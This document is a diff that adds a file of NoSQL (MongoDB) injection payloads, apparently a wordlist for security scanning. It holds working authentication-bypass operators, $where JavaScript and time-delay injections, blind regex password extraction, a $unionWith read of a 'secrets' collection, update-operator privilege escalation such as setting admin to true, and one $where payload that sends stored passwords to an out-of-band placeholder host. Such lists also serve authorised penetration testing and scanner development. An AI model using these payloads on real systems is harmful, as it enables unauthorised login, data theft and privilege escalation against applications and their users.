@@ -1,0 +1,59 @@
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
+{"username":{"$in":["admin","administrator","root"]},"password":{"$gt":""}}
+{"username":{"$gt":""},"password":{"$exists":true}}
+{"$where":"this.username=='admin'"}
+{"$where":"1==1"}
+{"$where":"function(){return true}"}
+{"$where":"function(){return this.username.length>0}"}
+{"$where":"sleep(5000)"}
+{"$where":"d=new Date;do{n=new Date;}while(n-d<5000);1"}
+{"username":"admin","password":{"$regex":"^a","$options":"i"}}
+{"username":"admin","password":{"$regex":"^.{1,100}$"}}
+{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$gt":""}}
+{"$and":[{"username":{"$ne":null}},{"password":{"$ne":null}}]}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+'; return true; var foo='
+'; return '' == '
+';return true;//
+{"$gt": ""}
+{"$ne": 1}
+{"$in": [1,2,3]}
+{"$nin": []}
+{"$exists": true}
+{"$type": 2}
+{"$mod": [10,0]}
+{"$text": {"$search": "admin"}}
+{"$elemMatch": {"$gt": 0}}
+a];return true;
+# New: regex extraction (char-by-char blind)
+{"username":"admin","password":{"$regex":"^a"}}
+{"username":"admin","password":{"$regex":"^ab"}}
+{"username":"admin","password":{"$regex":"^.{8}$"}}
+# Aggregation pipeline injection
+{"$facet":{"count":[{"$count":"n"}]}}
+{"$unionWith":{"coll":"secrets","pipeline":[]}}
+# JavaScript RCE via $where (MongoDB 4.x)
+{"$where":"function(){return hex_md5('test')==='098f6bcd4621d373cade4e832627b4f6'}"}
+# Server-side JavaScript injection
+{"$where":"var x=new XMLHttpRequest();x.open('GET','http://INTERACTSH_URL/?c='+this.password,false);x.send();return true;"}
+# Operator bypass in nested documents
+{"nested.field":{"$gt":""}}
+{"a.b.c":{"$ne":null}}
+# Blind injection via array length
+{"$where":"this.roles.length>0"}
+{"$where":"this.tokens.length>0"}
+# ObjectId injection
+{"_id":{"$gt":{"$oid":"000000000000000000000000"}}}
+{"_id":{"$type":7}}
+# Update operator injection (in update endpoints)
+{"$set":{"admin":true}}
+{"$set":{"role":"admin"}}
+{"$unset":{"disabled":1}}
+{"$push":{"roles":"admin"}}
+{"$addToSet":{"permissions":"*"}}
+# Projection injection
+{"password":1,"_id":0}
